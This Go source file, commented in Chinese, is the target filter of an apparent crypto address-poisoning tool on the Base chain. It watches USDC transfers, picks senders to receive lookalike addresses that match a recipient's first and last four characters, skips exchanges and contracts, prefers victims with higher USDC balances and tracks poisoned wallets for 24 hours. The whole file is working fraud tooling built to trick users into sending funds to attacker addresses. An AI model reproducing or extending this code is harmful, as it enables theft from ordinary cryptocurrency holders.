package core

import (
	"context"
	"math/big"
	"strings"
	"sync"
	"time"

	"github.com/ethereum/go-ethereum"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/ethclient"
	lru "github.com/hashicorp/golang-lru/v2"
	"go.uber.org/zap"
)

const (
	// 已投毒地址缓存大小
	poisonedCacheSize = 100000
	// 已投毒TTL (24小时)
	poisonedTTL = 24 * time.Hour
)

// Target 目标信息
// 逻辑: A→B转账，MatchAddr=B(接收方)用于匹配伪造地址，PoisonTo=A(发送方)是投毒目标
type Target struct {
	Address   string   // 原始接收方地址(B) - 用于兼容
	MatchAddr string   // 用于匹配伪造地址的地址(B) - 前后4位
	PoisonTo  string   // 投毒目标地址(A) - 发送方，最终接收投毒
	Amount    *big.Int // 代币金额 (最小单位)
	AmountUSD float64  // USD金额
	TxHash    string   // 原始交易哈希
	From      string   // 发送方地址(A)
	BlockNum  uint64   // 区块号
	TokenType string   // 代币类型: "USDC" (Base链只支持USDC)
}

// FilterConfig 过滤器配置 (Base链: 只监控USDC)
type FilterConfig struct {
	MinTargetUSDCBalance float64 // 目标地址最小USDC余额 (低于此值跳过, Base USDC 6位小数)
	MinTransferAmountUSD float64 // 最小转账金额 (低于此值直接跳过，默认1 USD)
}

// poisonedEntry 已投毒条目
type poisonedEntry struct {
	expireAt time.Time
}

// Filter 轻量级目标过滤器 (纯内存版, Base链)
type Filter struct {
	blacklist        *Blacklist
	contractDetector *ContractDetector
	ethClient        *ethclient.Client                 // 用于查询余额
	usdcAddr         common.Address                    // USDC合约地址 (Base: 6位小数)
	poisonedCache    *lru.Cache[string, poisonedEntry] // 已投毒地址缓存
	logger           *zap.Logger
	config           FilterConfig
	mu               sync.RWMutex
}

// NewFilter 创建过滤器 (纯内存版)
func NewFilter(
	blacklist *Blacklist,
	contractDetector *ContractDetector,
	logger *zap.Logger,
	config FilterConfig,
) (*Filter, error) {
	return NewFilterWithUSDC(blacklist, contractDetector, nil, "", logger, config)
}

// NewFilterWithClient 创建过滤器 (带ethClient用于余额查询) - 兼容旧接口
func NewFilterWithClient(
	blacklist *Blacklist,
	contractDetector *ContractDetector,
	ethClient *ethclient.Client,
	usdcContract string,
	logger *zap.Logger,
	config FilterConfig,
) (*Filter, error) {
	return NewFilterWithUSDC(blacklist, contractDetector, ethClient, usdcContract, logger, config)
}

// NewFilterWithUSDC 创建过滤器 (Base链: 只支持USDC)
func NewFilterWithUSDC(
	blacklist *Blacklist,
	contractDetector *ContractDetector,
	ethClient *ethclient.Client,
	usdcContract string,
	logger *zap.Logger,
	config FilterConfig,
) (*Filter, error) {
	poisonedCache, err := lru.New[string, poisonedEntry](poisonedCacheSize)
	if err != nil {
		return nil, err
	}

	var usdcAddr common.Address
	if usdcContract != "" {
		usdcAddr = common.HexToAddress(usdcContract)
	}

	return &Filter{
		blacklist:        blacklist,
		contractDetector: contractDetector,
		ethClient:        ethClient,
		usdcAddr:         usdcAddr,
		poisonedCache:    poisonedCache,
		logger:           logger,
		config:           config,
	}, nil
}

// NewFilterWithTokens 创建过滤器 (兼容旧接口, 只使用USDC)
func NewFilterWithTokens(
	blacklist *Blacklist,
	contractDetector *ContractDetector,
	ethClient *ethclient.Client,
	_, usdcContract, _ string, // Base链只使用USDC
	logger *zap.Logger,
	config FilterConfig,
) (*Filter, error) {
	return NewFilterWithUSDC(blacklist, contractDetector, ethClient, usdcContract, logger, config)
}

// ShouldPoison 判断是否应该投毒
// 返回: true=应该投毒, false=跳过
// 逻辑: A→B转账，检查A(发送方/投毒目标)是否是合约，如果是则跳过
func (f *Filter) ShouldPoison(ctx context.Context, target Target) bool {
	// 0. 检查转账金额是否大于最小值 (默认1 USDT)
	minTransfer := f.config.MinTransferAmountUSD
	if minTransfer <= 0 {
		minTransfer = 1.0 // 默认最小1 USDT
	}
	if target.AmountUSD < minTransfer {
		f.logger.Debug("Filtered: transfer amount too small",
			zap.Float64("amount", target.AmountUSD),
			zap.Float64("min", minTransfer))
		return false
	}

	// 投毒目标地址 (发送方A)
	poisonTo := strings.ToLower(strings.TrimPrefix(target.PoisonTo, "0x"))
	if poisonTo == "" {
		poisonTo = strings.ToLower(strings.TrimPrefix(target.From, "0x"))
	}

	// 接收方地址 (B) - 用于黑名单检查
	receiverAddr := strings.ToLower(strings.TrimPrefix(target.Address, "0x"))
	if receiverAddr == "" {
		receiverAddr = strings.ToLower(strings.TrimPrefix(target.MatchAddr, "0x"))
	}

	// 1. 检查接收方是否在交易所黑名单 (O(1) 内存查询)
	if f.blacklist.IsBlacklisted(receiverAddr) {
		f.logger.Debug("Filtered: receiver in exchange blacklist", zap.String("receiver", receiverAddr))
		return false
	}

	// 2. 检查发送方(投毒目标A)是否在交易所黑名单
	if f.blacklist.IsBlacklisted(poisonTo) {
		f.logger.Debug("Filtered: sender in exchange blacklist", zap.String("sender", poisonTo))
		return false
	}

	// 3. 检查发送方(投毒目标A)是否是合约地址 - 关键检查！
	// 如果A是合约，投毒没有意义，因为合约不会手动复制地址
	if poisonTo != "" {
		isContract, err := f.contractDetector.IsContract(ctx, poisonTo)
		if err != nil {
			f.logger.Warn("Contract check failed for sender", zap.Error(err))
			// 出错时默认放行
		} else if isContract {
			f.logger.Debug("Filtered: sender is contract", zap.String("sender", poisonTo))
			return false
		}
	}

	// 4. 检查发送方是否已投毒 (24小时内)
	if f.alreadyPoisoned(ctx, poisonTo) {
		f.logger.Debug("Filtered: sender already poisoned", zap.String("sender", poisonTo))
		return false
	}

	// 5. 检查投毒目标(A)的USDC余额 (Base链只检查USDC)
	if f.ethClient != nil && poisonTo != "" && f.usdcAddr != (common.Address{}) {
		minBalance := f.config.MinTargetUSDCBalance
		if minBalance > 0 {
			balance, err := f.getTokenBalance(ctx, poisonTo, f.usdcAddr)
			if err != nil {
				f.logger.Debug("Failed to get USDC balance", zap.Error(err))
				// 查询失败放行
			} else {
				// Base USDC: 6位小数
				balanceFloat := new(big.Float).SetInt(balance)
				divisor := new(big.Float).SetFloat64(1e6) // USDC 6位小数
				balanceFloat.Quo(balanceFloat, divisor)
				balanceVal, _ := balanceFloat.Float64()

				if balanceVal < minBalance {
					f.logger.Debug("Filtered: low USDC balance",
						zap.String("target", poisonTo[:10]+"..."),
						zap.Float64("balance", balanceVal),
						zap.Float64("min", minBalance))
					return false
				}
			}
		}
	}

	return true
}

// alreadyPoisoned 检查地址是否已投毒 (纯内存)
func (f *Filter) alreadyPoisoned(_ context.Context, address string) bool {
	addr := strings.ToLower(strings.TrimPrefix(address, "0x"))
	entry, ok := f.poisonedCache.Get(addr)
	if !ok {
		return false
	}
	// 检查是否过期
	if time.Now().After(entry.expireAt) {
		f.poisonedCache.Remove(addr)
		return false
	}
	return true
}

// MarkPoisoned 标记地址为已投毒 (纯内存)
func (f *Filter) MarkPoisoned(_ context.Context, address string) error {
	addr := strings.ToLower(strings.TrimPrefix(address, "0x"))
	f.poisonedCache.Add(addr, poisonedEntry{
		expireAt: time.Now().Add(poisonedTTL),
	})
	return nil
}

// MarkPoisonedBatch 批量标记已投毒 (纯内存)
func (f *Filter) MarkPoisonedBatch(_ context.Context, addresses []string) error {
	expireAt := time.Now().Add(poisonedTTL)
	for _, addr := range addresses {
		f.poisonedCache.Add(strings.ToLower(strings.TrimPrefix(addr, "0x")), poisonedEntry{
			expireAt: expireAt,
		})
	}
	return nil
}

// FilterStats 返回过滤统计
type FilterStats struct {
	BlacklistCount int
	PoisonedCount  int
}

// Stats 获取过滤器统计 (纯内存)
func (f *Filter) Stats(_ context.Context) FilterStats {
	return FilterStats{
		BlacklistCount: f.blacklist.Count(),
		PoisonedCount:  f.poisonedCache.Len(),
	}
}

// CleanExpired 清理过期的已投毒地址
func (f *Filter) CleanExpired() int {
	now := time.Now()
	var cleaned int
	keys := f.poisonedCache.Keys()
	for _, key := range keys {
		if entry, ok := f.poisonedCache.Peek(key); ok {
			if now.After(entry.expireAt) {
				f.poisonedCache.Remove(key)
				cleaned++
			}
		}
	}
	return cleaned
}

// getUSDCBalance 查询地址的USDC余额 (Base链)
func (f *Filter) getUSDCBalance(ctx context.Context, address string) (*big.Int, error) {
	return f.getTokenBalance(ctx, address, f.usdcAddr)
}

// getTokenBalance 查询地址的代币余额
func (f *Filter) getTokenBalance(ctx context.Context, address string, tokenAddr common.Address) (*big.Int, error) {
	if f.ethClient == nil || tokenAddr == (common.Address{}) {
		return nil, nil
	}

	// 补全0x前缀
	if !strings.HasPrefix(address, "0x") {
		address = "0x" + address
	}

	// balanceOf(address) 方法签名: 0x70a08231
	// 后面跟着32字节的地址参数
	methodID := common.Hex2Bytes("70a08231")
	paddedAddress := common.LeftPadBytes(common.HexToAddress(address).Bytes(), 32)

	callData := append(methodID, paddedAddress...)

	result, err := f.ethClient.CallContract(ctx, ethereum.CallMsg{
		To:   &tokenAddr,
		Data: callData,
	}, nil)
	if err != nil {
		return nil, err
	}

	if len(result) < 32 {
		return big.NewInt(0), nil
	}

	return new(big.Int).SetBytes(result), nil
}
